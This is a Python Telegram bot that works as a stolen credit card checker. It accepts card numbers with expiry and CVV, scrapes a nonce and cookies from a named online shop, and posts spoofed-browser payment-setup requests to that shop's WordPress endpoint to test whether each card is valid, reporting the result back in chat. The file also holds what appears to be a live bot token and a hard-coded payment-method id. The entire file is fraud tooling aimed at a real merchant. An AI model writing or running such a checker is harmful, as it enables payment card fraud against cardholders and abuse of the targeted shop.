import telebot
import requests
import re
from faker import Faker

TOKEN = '8072279299:AAHPYhOiKdnivLNkonK_RTISmhE40ucoVik'
bot = telebot.TeleBot(TOKEN)
fake = Faker()

FIRST_URL = "https://kiltermonpurepasture.com/my-account-2/"
FINAL_URL = "https://kiltermonpurepasture.com/wp-admin/admin-ajax.php"

def get_random_email():
    return fake.email()

def get_cookies_and_nonce():
    session = requests.Session()
    resp = session.get(FIRST_URL, headers={
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    })
    cookies = session.cookies.get_dict()
    # Try to extract _ajax_nonce from HTML (hidden input or JS variable)
    match = re.search(r'name="_ajax_nonce"\s+value="([^"]+)"', resp.text)
    if not match:
        match = re.search(r'_ajax_nonce["\']\s*:\s*["\']([^"\']+)["\']', resp.text)
    nonce = match.group(1) if match else None
    return cookies, nonce

def extract_pm_id(card, email):
    # Placeholder: implement Stripe logic as needed
    return "pm_1RLFKDCGos24OgXQ470HOXnj"

def build_cookie_header(cookies):
    return "; ".join([f"{k}={v}" for k, v in cookies.items()])

def check_card(card_data):
    parts = card_data.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: CC|MM|YY|CVV or CC|MM|YYYY|CVV"
    cc, mm, yy, cvv = [x.strip() for x in parts]
    if len(yy) == 2:
        yy = f"20{yy}"
    elif len(yy) != 4:
        return "❌ Invalid year format (use 2 or 4 digits)."

    email = get_random_email()
    cookies, ajax_nonce = get_cookies_and_nonce()
    if not ajax_nonce:
        return "❌ Could not find _ajax_nonce value on the page."

    pm_id = extract_pm_id(card_data, email)

    boundary = '----WebKitFormBoundaryLDAs04rYKJqlswfi'
    data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="action"\r\n\r\n'
        f'create_setup_intent\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="wcpay-payment-method"\r\n\r\n'
        f'{pm_id}\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
        f'{ajax_nonce}\r\n'
        f'--{boundary}--\r\n'
    )

    headers = {
        'Host': 'kiltermonpurepasture.com',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Fetch-Mode': 'cors',
        'Origin': 'https://kiltermonpurepasture.com',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1',
        'Referer': 'https://kiltermonpurepasture.com/my-account-2/add-payment-method/',
        'Cookie': build_cookie_header(cookies)
    }

    try:
        response = requests.post(FINAL_URL, headers=headers, data=data, timeout=15)
        result = (
            f"🟢 Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"📧 Email: {email}\n"
            f"🔍 Response:\n{response.text}"
        )
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send card in format: CC|MM|YY|CVV or CC|MM|YYYY|CVV")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    text = message.text.strip()
    if '|' in text:
        result = check_card(text)
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YY|CVV or CC|MM|YYYY|CVV")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()